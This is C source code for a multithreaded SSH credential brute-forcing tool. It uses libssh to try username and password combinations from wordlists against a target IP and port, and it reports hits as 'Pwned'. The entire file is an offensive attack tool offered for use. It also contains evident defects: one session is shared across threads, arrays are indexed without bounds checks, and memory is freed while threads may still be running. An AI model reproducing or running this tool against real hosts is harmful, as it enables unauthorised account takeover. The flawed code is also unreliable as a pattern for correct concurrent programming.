#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <libssh/libssh.h>
#include <string.h>
#include <getopt.h>
#include <sys/epoll.h>
#include <stdbool.h>
typedef struct {

    char *target_address;
    int port;

} Target;


Target target_address[10];

int attempts = 0;

void *threaded_attack(void *arg) {
    ssh_session session = *((ssh_session *) arg);
    char *username = *((char **) (arg + sizeof(ssh_session)));
    char *password = *((char **) (arg + sizeof(ssh_session) + sizeof(char *)));

    int rc = ssh_userauth_password(session, username, password);

    if (rc == SSH_AUTH_SUCCESS) {
        printf("[+] Pwned: Username '%s' and Password '%s'", username, password);
    } else {
        attempts++;
        printf("[-] Attempt %d, username '%s', password '%s", attempts, username, password);
    }

    pthread_exit(NULL);
}

void load_password_list(char **list_path, char ***passwords, int *password_count) {
    FILE *file;
    const char *filepath = *list_path;
    file = fopen(filepath, "r");
    if (file) {
        char word[512];
        while (fscanf(file, "%255s", word) == 1) {
            *passwords = realloc(*passwords, (*password_count + 1) * sizeof(char*));

            if (*passwords == NULL) {
                fprintf(stderr, "Error allocating memory\n");
                exit(1);
            }

            char *new_password = malloc(strlen(word) + 1);
            strcpy(new_password, word);
            (*passwords)[*password_count] = new_password;
            (*password_count)++;
        }
        fclose(file);
    } else {
        fprintf(stderr, "Error opening file\n");
        exit(1);
    }
}

void load_single_password(char *password, char ***passwords, int *password_count) {
    *passwords = (char **)malloc(sizeof(char *));

    if (*passwords == NULL) {
        fprintf(stderr, "Couldn't allocate memory");
        exit(1);
    }

    char *singlepass = password;
    (*passwords)[0] = strdup(singlepass);
   *password_count = 1;
}


void load_single_username(char *username, char ***usernames, int *user_count) {
    *usernames = (char **)malloc(sizeof(char*));

    if (*usernames == NULL) {
        fprintf(stderr, "Memory not allocated");
        exit(1);
    }

    char *singleuser = username;
    (*usernames)[0] = strdup(singleuser);
    *user_count = 1;
}


void load_user_list(char **list_path, char ***usernames, int *user_count) {
    FILE *file;
    const char *filepath = *list_path;
    file = fopen(filepath, "r");
    if (file) {
        char word[512];
        while (fscanf(file, "%255s", word) == 1) {
            *usernames = realloc(*usernames, (*user_count + 1) * sizeof(char*));
            if (*usernames == NULL) {
                fprintf(stderr, "Error allocating memory\n");
                exit(1);
            }

            char *new_user = malloc(strlen(word) + 1);
            strcpy(new_user, word);
            (*usernames)[*user_count] = new_user;
            (*user_count)++;
        }

        fclose(file);
    } else {
        fprintf(stderr, "Error opening file\n");
        exit(1);
    }
}




void attack_ssh(Target target_address, int thread_numbers, char **passwords, char **usernames) {
    ssh_session session;
    int rc;
    pthread_t threads[thread_numbers];
    session = ssh_new();
    if (session == NULL) {
        printf("Could not establish SSH session.");
        exit(-1);
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, target_address.target_address);
    ssh_options_set(session, SSH_OPTIONS_PORT, &target_address.port);
    rc = ssh_connect(session);

    if (rc != SSH_OK) {
        printf("Connection not possible with %s on port %d", target_address.target_address, target_address.port);
        ssh_free(session);
        exit(-1);
    }

    for (int i = 0; i < thread_numbers; i++) {
        void *arg = malloc(sizeof(ssh_session) + sizeof(char *)  * 2);
        *((ssh_session *) arg) = session;
        *((char **) (arg + sizeof(ssh_session))) = usernames[i];
        *((char **) (arg + sizeof(ssh_session) + sizeof(char *))) = passwords[i];
        pthread_create(&threads[i], NULL, threaded_attack, arg);
    }
}

int main(int argc, char *argv[]) {
    int c, thread_count = 1;
    int password_count = 0;
    int user_count = 0;
    char *username_list = NULL;
    char *password_list = NULL;
    char **passwords = NULL;
    char **usernames = NULL;
    
    while ((c = getopt(argc, argv, "t:u:p:S:P:")) != -1) {
        switch (c) {
            case 't':
                thread_count = atoi(optarg);
                break;
            case 'u':
                load_single_username(optarg, &usernames, &user_count);
                break;
            case 'p':
                load_single_password(optarg, &passwords, &password_count);
                break;
            case 'S':
                username_list = optarg;
                break;
            case 'P':
                password_list = optarg;
                break;

            default:
                printf("Usage: %s [-t threads] [-u single_username] [-p single_password] [-S username_list] [-P password_list] <ip_address> <port>\n", argv[0]);
                return 1;
        }
    }

    if (argc < optind + 2) {
        printf("Usage: %s [-t threads] [-u single_username] [-p single_password] [-S username_list] [-P password_list] <ip_address> <port>\n", argv[0]);
        return 1;
    }   

    char *ip_address = argv[optind];
    int port = atoi(argv[optind + 1]);
    int thread_numbers = thread_count;
    
    if (!passwords && password_list) {
        load_password_list(&password_list, &passwords, &password_count);
    }

    if (!usernames && username_list) {
        load_user_list(&username_list, &usernames, &user_count);
    }

    printf("IP Address: %s\n", ip_address);
    printf("Port: %d\n", port);

    Target target;
    target.target_address = ip_address;
    target.port = port;
    attack_ssh(target, thread_numbers, passwords, usernames);

    // Free allocated memory for passwords and usernames
    for (int i = 0; i < password_count; i++) {
        free(passwords[i]);
    }
    free(passwords);

    for (int i = 0; i < user_count; i++) {
        free(usernames[i]);
    }
    free(usernames);

    return 0;
}

